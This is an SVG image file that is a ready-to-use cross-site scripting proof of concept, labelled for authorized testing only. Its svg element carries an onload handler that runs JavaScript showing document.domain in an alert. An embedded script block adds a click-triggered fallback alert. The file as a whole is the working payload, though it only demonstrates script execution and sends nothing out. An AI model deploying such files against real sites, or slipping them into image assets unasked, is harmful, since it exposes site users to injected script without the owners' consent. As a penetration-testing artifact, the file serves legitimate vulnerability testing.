<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
 "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" width="480" height="200" onload="alert('SVG XSS PoC: ' + document.domain)">
  <title>SVG XSS PoC (Authorized Testing Only)</title>
  <rect x="0" y="0" width="100%" height="100%" fill="#f2f2f2"/>
  <text x="24" y="110" font-size="24" font-family="Arial, Helvetica, sans-serif">SVG XSS PoC — onload alert()</text>
  <!-- Secondary click trigger as fallback if onload is blocked -->
  <a id="clickme" xlink:href="#" xmlns:xlink="http://www.w3.org/1999/xlink">
    <text x="24" y="150" font-size="16" font-family="Arial, Helvetica, sans-serif" text-decoration="underline">
      Click here if the alert didn't show
    </text>
  </a>
  <script type="application/ecmascript"><![CDATA[
    document.getElementById('clickme').addEventListener('click', function (e) {
      e.preventDefault();
      alert('SVG XSS click fallback: ' + document.domain);
    });
  ]]></script>
</svg>
